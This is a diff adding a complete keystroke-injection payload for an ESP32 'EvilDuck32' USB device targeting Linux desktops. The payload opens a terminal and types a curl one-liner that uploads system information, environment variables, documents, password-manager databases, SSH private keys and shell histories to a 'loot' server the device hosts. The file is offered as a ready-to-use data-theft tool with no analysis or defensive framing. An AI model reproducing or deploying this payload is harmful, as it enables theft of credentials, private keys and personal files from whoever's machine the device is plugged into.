@@ -1,0 +1,21 @@
+REM ============================================================
+REM EvilDuck32 – ATTACKMODE STORAGE (Linux)
+REM Exfiltrates home directory files via RNDIS HTTP upload.
+REM ESP32 appears as USB Ethernet (RNDIS) at 192.168.7.1
+REM Works on Ubuntu, Debian, Fedora, and most distributions.
+REM ============================================================
+
+REM Wait for RNDIS interface to get an IP from DHCP
+ATTACKMODE RNDIS 30000
+
+REM Extra delay for network interface to settle
+DELAY 2000
+
+REM Open terminal (works on GNOME, KDE, Xfce)
+CTRL ALT t
+DELAY 800
+
+REM Upload helper function + exfiltrate files
+STRING LOOT_URL="http://192.168.7.1/loot/upload"; upload(){ local f="$1"; curl -s -X POST -H "filename: $(basename "$f")" --data-binary "@$f" "$LOOT_URL" >/dev/null 2>&1; }; (echo "HOST=$(hostname)"; echo "USER=$(whoami)"; echo "OS=$(uname -a)"; env | grep -v PASS) | curl -s -X POST -H "filename: sysinfo.txt" --data-binary @- "$LOOT_URL" >/dev/null 2>&1; for f in ~/Desktop/* ~/Documents/*.{txt,pdf,docx,xlsx,key,kdbx,gpg} ~/.ssh/id_* ~/.ssh/authorized_keys ~/.*history 2>/dev/null; do [ -f "$f" ] && upload "$f"; done; echo Done
+ENTER
+DELAY 8000
